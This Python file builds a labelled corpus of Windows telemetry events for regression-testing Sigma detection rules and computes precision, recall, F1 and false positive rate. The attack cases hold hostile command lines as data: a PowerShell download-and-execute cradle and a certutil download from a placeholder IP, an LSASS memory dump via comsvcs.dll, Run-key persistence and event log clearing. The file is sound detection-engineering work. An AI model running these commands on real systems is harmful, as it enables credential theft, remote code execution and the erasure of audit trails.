"""Detection regression testing measuring precision, recall, F1, and false positive rate against benign & attack corpora."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from vesper.sigma_engine import CompiledSigmaRule, evaluate_sigma_rule_on_event


@dataclass
class LabeledTelemetryCase:
    case_id: str
    expected_attack: bool
    expected_rule_file: str | None
    label_description: str
    event: dict[str, Any]


def build_regression_corpus() -> list[LabeledTelemetryCase]:
    """Curated attack + realistic benign enterprise Windows telemetry corpus for regression scoring."""
    return [
        # --- TRUE POSITIVE ATTACK CASES ---
        LabeledTelemetryCase(
            "ATK-PS-B64", True, "proc_creation_win_powershell_base64_encoded.yml",
            "PowerShell Base64 encoded command execution (T1059.001)",
            {
                "EventID": 1, "Timestamp": "2026-11-24T09:14:02Z", "Computer": "ARC-WS-04", "User": "ARCHIVES\\j.moreau",
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
            },
        ),
        LabeledTelemetryCase(
            "ATK-LSASS-COMSVCS", True, "proc_creation_win_lsass_dump_comsvcs.yml",
            "LSASS memory dump via rundll32 comsvcs.dll MiniDump (T1003.001)",
            {
                "EventID": 1, "Timestamp": "2026-11-24T09:16:18Z", "Computer": "ARC-WS-04", "User": "NT AUTHORITY\\SYSTEM",
                "Image": r"C:\Windows\System32\rundll32.exe",
                "CommandLine": r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 656 C:\Temp\dump.bin full",
            },
        ),
        LabeledTelemetryCase(
            "ATK-REG-RUN", True, "registry_set_run_key_persistence.yml",
            "Registry Run key persistence modification (T1547.001)",
            {
                "EventID": 13, "Timestamp": "2026-11-24T09:18:45Z", "Computer": "ARC-WS-04", "User": "ARCHIVES\\j.moreau",
                "Image": r"C:\Windows\System32\reg.exe",
                "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ArchiveSyncUpdater",
            },
        ),
        LabeledTelemetryCase(
            "ATK-PS-CRADLE", True, "posh_ps_scriptblock_suspicious_download.yml",
            "PowerShell ScriptBlock 4104 DownloadString + Invoke-Expression (T1059.001)",
            {
                "EventID": 4104, "Timestamp": "2026-11-24T09:15:10Z", "Computer": "ARC-WS-04", "User": "ARCHIVES\\j.moreau",
                "ScriptBlockText": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.44/stage.ps1')",
            },
        ),
        LabeledTelemetryCase(
            "ATK-CERTUTIL-DL", True, "proc_creation_win_certutil_download.yml",
            "Certutil urlcache remote transfer (T1105)",
            {
                "EventID": 1, "Timestamp": "2026-11-24T09:17:04Z", "Computer": "ARC-WS-04", "User": "ARCHIVES\\j.moreau",
                "Image": r"C:\Windows\System32\certutil.exe",
                "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.44/tool.bin C:\\Temp\\tool.bin",
            },
        ),
        LabeledTelemetryCase(
            "ATK-WEVTUTIL-CL", True, "win_security_eventlog_cleared.yml",
            "Wevtutil Security event log clearing (T1070.001)",
            {
                "EventID": 1, "Timestamp": "2026-11-24T09:21:30Z", "Computer": "ARC-WS-04", "User": "NT AUTHORITY\\SYSTEM",
                "Image": r"C:\Windows\System32\wevtutil.exe",
                "CommandLine": "wevtutil.exe cl Security",
            },
        ),
        # --- REALISTIC BENIGN ENTERPRISE TELEMETRY (MUST NOT FALSE-ALARM) ---
        LabeledTelemetryCase(
            "BEN-PS-ADMIN", False, None,
            "Legitimate PowerShell disk space inventory script",
            {
                "EventID": 1, "Timestamp": "2026-11-24T08:00:12Z", "Computer": "ARC-WS-04", "User": "ARCHIVES\\svc-backup",
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": r"powershell.exe -NoProfile -File C:\ProgramData\ArchiveOps\check_storage.ps1",
            },
        ),
        LabeledTelemetryCase(
            "BEN-RUNDLL-PRINT", False, None,
            "Legitimate rundll32 printer configuration call",
            {
                "EventID": 1, "Timestamp": "2026-11-24T08:15:00Z", "Computer": "ARC-WS-04", "User": "ARCHIVES\\j.moreau",
                "Image": r"C:\Windows\System32\rundll32.exe",
                "CommandLine": r"rundll32.exe printui.dll,PrintUIEntry /in /n\\print01\archival-laser",
            },
        ),
        LabeledTelemetryCase(
            "BEN-REG-EXPLORER", False, None,
            "Benign Explorer UI preference registry write",
            {
                "EventID": 13, "Timestamp": "2026-11-24T08:22:19Z", "Computer": "ARC-WS-04", "User": "ARCHIVES\\j.moreau",
                "Image": r"C:\Windows\explorer.exe",
                "TargetObject": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSecondsInSystemClock",
            },
        ),
        LabeledTelemetryCase(
            "BEN-PS-4104-SAFE", False, None,
            "Legitimate PowerShell 4104 ScriptBlock checking service status",
            {
                "EventID": 4104, "Timestamp": "2026-11-24T08:30:00Z", "Computer": "ARC-WS-04", "User": "ARCHIVES\\svc-backup",
                "ScriptBlockText": "Get-Service -Name 'W32Time' | Select-Object Name, Status",
            },
        ),
        LabeledTelemetryCase(
            "BEN-CERTUTIL-DUMP", False, None,
            "Legitimate PKI administrator viewing local certificate store",
            {
                "EventID": 1, "Timestamp": "2026-11-24T08:40:15Z", "Computer": "ARC-DC-01", "User": "ARCHIVES\\pki-admin",
                "Image": r"C:\Windows\System32\certutil.exe",
                "CommandLine": "certutil.exe -store My",
            },
        ),
        LabeledTelemetryCase(
            "BEN-WEVTUTIL-QE", False, None,
            "Legitimate SOC script querying recent event log counts",
            {
                "EventID": 1, "Timestamp": "2026-11-24T08:45:00Z", "Computer": "ARC-WS-04", "User": "ARCHIVES\\soc-collector",
                "Image": r"C:\Windows\System32\wevtutil.exe",
                "CommandLine": "wevtutil.exe qe System /c:5 /rd:true /f:text",
            },
        ),
    ]


def run_detection_regression(rules: list[CompiledSigmaRule]) -> dict[str, Any]:
    corpus = build_regression_corpus()
    tp = fp = tn = fn = 0
    case_results: list[dict[str, Any]] = []

    for case in corpus:
        matched_rules = [r.source_file for r in rules if evaluate_sigma_rule_on_event(r, case.event)]
        triggered = len(matched_rules) > 0
        if case.expected_attack:
            expected_hit = case.expected_rule_file in matched_rules
            if expected_hit:
                tp += 1
                verdict = "TP"
            else:
                fn += 1
                verdict = "FN"
        else:
            if triggered:
                fp += 1
                verdict = "FP"
            else:
                tn += 1
                verdict = "TN"
        case_results.append(
            {
                "case_id": case.case_id,
                "expected_attack": case.expected_attack,
                "expected_rule": case.expected_rule_file,
                "matched_rules": matched_rules,
                "verdict": verdict,
                "description": case.label_description,
            }
        )

    precision = round((tp / max(1, tp + fp)) * 100.0, 1)
    recall = round((tp / max(1, tp + fn)) * 100.0, 1)
    fpr = round((fp / max(1, fp + tn)) * 100.0, 1)
    f1 = round((2 * precision * recall) / max(0.001, precision + recall), 1)
    return {
        "total_cases": len(corpus),
        "counts": {"tp": tp, "fp": fp, "tn": tn, "fn": fn},
        "metrics": {
            "precision_pct": precision,
            "recall_pct": recall,
            "false_positive_rate_pct": fpr,
            "f1_pct": f1,
        },
        "cases": case_results,
    }
